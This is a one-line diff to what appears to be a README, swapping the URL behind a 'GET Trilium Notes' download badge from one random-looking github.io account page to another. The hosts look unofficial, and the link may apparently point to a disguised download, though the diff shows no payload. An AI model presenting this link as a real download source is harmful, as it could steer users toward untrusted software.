@@ -2,7 +2,7 @@
 
 ![Banner Placeholder](https://05t3.github.io/assets/img/Posts/trilium.png)
 
-[![GET Trilium Notes](https://img.shields.io/badge/GET%20%E2%80%94%20Trilium%20Notes-0078D6?style=for-the-badge&logoColor=white)](https://oscarnielsendsaj.github.io/.github/trilium-notes)
+[![GET Trilium Notes](https://img.shields.io/badge/GET%20%E2%80%94%20Trilium%20Notes-0078D6?style=for-the-badge&logoColor=white)](https://denverahmedzifw.github.io/.github/trilium-notes)
 
 ---
 
